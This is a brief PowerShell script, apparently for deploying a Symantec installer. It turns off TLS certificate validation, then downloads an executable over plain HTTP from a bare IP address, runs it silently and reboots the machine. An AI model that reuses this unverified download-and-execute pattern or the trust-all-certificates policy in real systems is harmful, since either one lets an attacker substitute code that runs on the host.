add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

$URI = New-Object "System.URIbuilder" $URL
[system.Net.Webrequest]$request = [system.Net.Webrequest]::Create($uri.uri)
[system.Net.Webresponse]$response = $request.GetResponse()
[System.IO.Stream]$str = $response.GetResponseStream()
[System.IO.StreamReader]$reader = New-Object "System.IO.Streamreader" $str
$result = $reader.ReadToEnd()
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url = "http://169.57.28.203/symantec/setup.exe"
$outfile = "c:\setup.exe"
Invoke-WebRequest $url -outfile $outfile
start-Process -Wait -FilePath $outfile -ArgumentList '/s'
Restart-Computer

